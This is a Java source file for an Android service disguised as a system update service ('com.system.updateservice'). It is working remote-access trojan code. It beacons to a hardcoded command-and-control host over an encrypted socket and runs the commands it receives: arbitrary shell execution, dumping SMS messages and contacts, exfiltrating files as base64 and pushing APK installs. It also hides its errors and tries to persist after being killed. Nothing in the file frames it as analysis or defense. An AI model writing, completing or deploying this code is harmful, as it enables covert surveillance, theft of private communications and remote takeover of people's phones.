package com.system.updateservice;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.*;
import java.util.concurrent.*;
import java.security.SecureRandom;
import javax.crypto.*;
import javax.crypto.spec.*;
import android.util.Base64;

public class CoreService extends Service {
    private static final String C2_HOST = "192.168.1.146";
    private static final int C2_PORT = 443;
    private static final long BEACON_MS = 60000;
    private ScheduledExecutorService sched;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        sched = Executors.newScheduledThreadPool(2);
        sched.scheduleAtFixedRate(this::beacon, 0, BEACON_MS, TimeUnit.MILLISECONDS);
        return START_STICKY;
    }

    private void beacon() {
        try {
            Socket s = new Socket();
            s.connect(new InetSocketAddress(C2_HOST, C2_PORT), 15000);

            // build info
            String info = "id=" + getDeviceId() +
                "&model=" + android.os.Build.MODEL +
                "&sdk=" + android.os.Build.VERSION.SDK_INT;

            DataOutputStream out = new DataOutputStream(s.getOutputStream());
            DataInputStream in = new DataInputStream(s.getInputStream());

            // AES-encrypt info
            byte[] key = deriveKey();
            byte[] enc = encrypt(info.getBytes(), key);
            out.writeInt(enc.length);
            out.write(enc);
            out.flush();

            // wait for task
            int taskLen = in.readInt();
            if (taskLen > 0 && taskLen < 65536) {
                byte[] taskBuf = new byte[taskLen];
                in.readFully(taskBuf);
                byte[] decrypted = decrypt(taskBuf, key);
                String task = new String(decrypted);
                String result = runTask(task);
                byte[] resultEnc = encrypt(result.getBytes(), key);
                out.writeInt(resultEnc.length);
                out.write(resultEnc);
                out.flush();
            }

            s.close();
        } catch (Exception e) {
            // silent — persist regardless
        }
    }

    private String runTask(String task) {
        try {
            if (task.startsWith("shell:")) {
                Process p = Runtime.getRuntime().exec(new String[]{
                    "/system/bin/sh", "-c", task.substring(6)
                });
                BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = r.readLine()) != null) sb.append(line).append("\n");
                return sb.toString();
            }
            if (task.equals("sms")) {
                return dumpSMS();
            }
            if (task.equals("contacts")) {
                return dumpContacts();
            }
            if (task.equals("location")) {
                return getLocation();
            }
            if (task.startsWith("exfil:")) {
                return exfilFile(task.substring(6));
            }
            if (task.startsWith("install:")) {
                return installApk(task.substring(8));
            }
        } catch (Exception e) {
            return "err: " + e.getMessage();
        }
        return "unknown task";
    }

    private String getDeviceId() {
        // Use ANDROID_ID (no permission needed on modern)
        return android.provider.Settings.Secure.getString(
            getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
    }

    private String dumpSMS() {
        StringBuilder sb = new StringBuilder();
        android.database.Cursor c = getContentResolver().query(
            android.net.Uri.parse("content://sms/inbox"), null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndexOrThrow("address")))
                  .append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow("body")))
                  .append("\n");
            }
            c.close();
        }
        return sb.toString();
    }

    private String dumpContacts() {
        StringBuilder sb = new StringBuilder();
        android.database.Cursor c = getContentResolver().query(
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null, null, null, null);
        if (c != null) {
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(": ")
                  .append(c.getString(c.getColumnIndexOrThrow(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n");
            }
            c.close();
        }
        return sb.toString();
    }

    private String getLocation() {
        // NOTE: needs ACCESS_FINE_LOCATION at runtime (API 23+)
        return "location stub";
    }

    private String exfilFile(String path) {
        try {
            File f = new File(path);
            if (!f.exists()) return "not found";
            byte[] buf = new byte[(int) f.length()];
            FileInputStream fis = new FileInputStream(f);
            fis.read(buf);
            fis.close();
            return Base64.encodeToString(buf, Base64.NO_WRAP);
        } catch (Exception e) {
            return "err: " + e.getMessage();
        }
    }

    private String installApk(String b64) {
        try {
            byte[] apk = Base64.decode(b64, Base64.NO_WRAP);
            File out = new File(getCacheDir(), "update.apk");
            FileOutputStream fos = new FileOutputStream(out);
            fos.write(apk);
            fos.close();
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setDataAndType(android.net.Uri.fromFile(out),
                "application/vnd.android.package-archive");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);
            return "install triggered";
        } catch (Exception e) {
            return "err: " + e.getMessage();
        }
    }

    // ---- crypto ----
    private byte[] deriveKey() throws Exception {
        // derive from device ID + static salt
        String seed = getDeviceId() + "shadowops-static";
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("SHA-256");
        return md.digest(seed.getBytes());
    }

    private byte[] encrypt(byte[] plain, byte[] key) throws Exception {
        byte[] iv = new byte[12];
        new SecureRandom().nextBytes(iv);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key, "AES"),
               new GCMParameterSpec(128, iv));
        byte[] ct = c.doFinal(plain);
        byte[] out = new byte[iv.length + ct.length];
        System.arraycopy(iv, 0, out, 0, iv.length);
        System.arraycopy(ct, 0, out, iv.length, ct.length);
        return out;
    }

    private byte[] decrypt(byte[] data, byte[] key) throws Exception {
        byte[] iv = new byte[12];
        System.arraycopy(data, 0, iv, 0, 12);
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"),
               new GCMParameterSpec(128, iv));
        return c.doFinal(data, 12, data.length - 12);
    }

    @Override
    public IBinder onBind(Intent i) { return null; }

    @Override
    public void onDestroy() {
        // restart if killed
        Intent restart = new Intent(this, CoreService.class);
        sendBroadcast(new Intent("com.system.restart"));
        super.onDestroy();
    }
}
